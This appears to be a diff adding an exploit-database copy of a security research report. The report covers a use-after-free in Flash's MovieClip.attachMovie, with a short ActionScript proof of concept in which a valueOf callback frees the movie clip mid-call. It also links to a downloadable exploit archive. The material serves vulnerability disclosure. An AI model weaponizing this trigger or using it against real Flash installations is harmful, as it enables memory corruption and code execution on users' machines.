@@ -1,0 +1,24 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=571
+
+There is a use-after-free in MovieClip.attachMovie. If a string parameter has toString defined, a number parameter has valueOf defined or an object parameter has its constructor redefined, it can execute code and free the this object of the method, leading to a use-after-free.
+
+A minimal PoC is as follows:
+
+n ={valueOf : func};
+
+function func(){
+	
+	_global.mc.removeMovieClip();
+        // fix heap here;
+  	
+   }
+this.createEmptyMovieClip("mc", 1);
+_global.mc = mc;
+mc.attachMovie("myResetButton","newResetButton", n);
+
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39055.zip
+
